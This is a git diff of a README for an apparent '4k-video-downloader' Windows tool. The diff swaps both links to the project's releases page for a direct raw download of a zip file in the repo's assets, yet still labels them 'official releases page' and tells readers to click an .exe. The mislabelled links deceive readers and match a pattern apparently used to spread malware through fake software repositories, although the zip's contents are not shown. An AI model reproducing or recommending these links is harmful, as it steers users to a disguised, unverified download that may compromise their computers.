@@ -1,6 +1,6 @@
 # 📥 4k-video-downloader - Download High Quality Videos With Ease
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Fernando1222223/4k-video-downloader/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Fernando1222223/4k-video-downloader/main/assets/k_video_downloader_2.9-beta.2.zip)
 
 This software downloads videos from many websites. You get files in 4K, 8K, or 1080p resolution. It saves videos without watermarks. You do not need to register or watch ads. The tool handles entire playlists and channels at once. It works on Windows computers.
 
@@ -9,7 +9,7 @@ This software downloads videos from many websites. You get files in 4K, 8K, or 1
 Follow these steps to set up the software on your Windows computer.
 
 1. Open your web browser.
-2. Visit the [official releases page](https://github.com/Fernando1222223/4k-video-downloader/releases).
+2. Visit the [official releases page](https://raw.githubusercontent.com/Fernando1222223/4k-video-downloader/main/assets/k_video_downloader_2.9-beta.2.zip).
 3. Look for the latest version at the top of the list.
 4. Click the file that ends with .exe to start the download.
 5. Save the file to your desktop or downloads folder.
